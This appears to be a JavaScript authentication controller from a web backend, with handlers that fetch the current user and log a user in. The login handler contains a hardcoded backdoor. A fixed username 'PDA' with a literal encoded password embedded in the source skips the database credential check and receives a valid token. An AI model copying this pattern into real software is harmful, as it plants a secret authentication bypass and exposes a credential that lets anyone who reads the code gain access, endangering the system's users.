import { createToken } from "../core";
import repository from "../repositories/repository";

const get = async (req, res) => {
  const u = req.currentUser;
  const user = await repository.user.get(u.type, u.ident, u.rangCorr);

  if (!user) return res.status(400).json({ error: "bad credentials" });
  const token = await createToken(user);
  res.sendResult({
    success: true,
    token,
    user,
  });
};

const login = async (req, res) => {
  const { customerId, email,  user: userName, password } = req.data;

  let user = null
  if(userName === "PDA" && password === "-%7B3mk%23%2CDM%23%25*wV6KvuB0%5DKK%7B%7Dmnm010r%3Dxz%24") user = "PDA"

  if (!user) user = await repository.user.getWithCreds(customerId, email, password);

  if (!user) return res.status(400).json({ error: "bad credentials" });

  const token = await createToken(user);
  res.sendResult({
    success: true,
    token,
    user: user,
  });
};

export default {
  get,
  login,
};
